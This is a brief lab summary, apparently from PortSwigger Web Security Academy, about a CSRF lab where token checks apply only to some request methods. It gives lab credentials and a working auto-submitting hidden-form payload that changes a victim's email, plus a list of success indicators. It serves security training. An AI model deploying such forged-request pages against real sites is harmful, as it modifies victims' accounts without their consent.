## CSRF where token validation depends on request method

**Category:** csrf
**Difficulty:** Unknown

### Description
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

### Solution Steps
You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

### Key Payloads
- `wiener:peter`
- `csrf`
- `<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>`

### Indicators of Success
- State-changing action performed without user consent
- No CSRF token required or token bypassable
- Forged request accepted by server
- Victim's account modified via attacker page
- SameSite cookie restrictions bypassed
---
*Source: PortSwigger Web Security Academy*
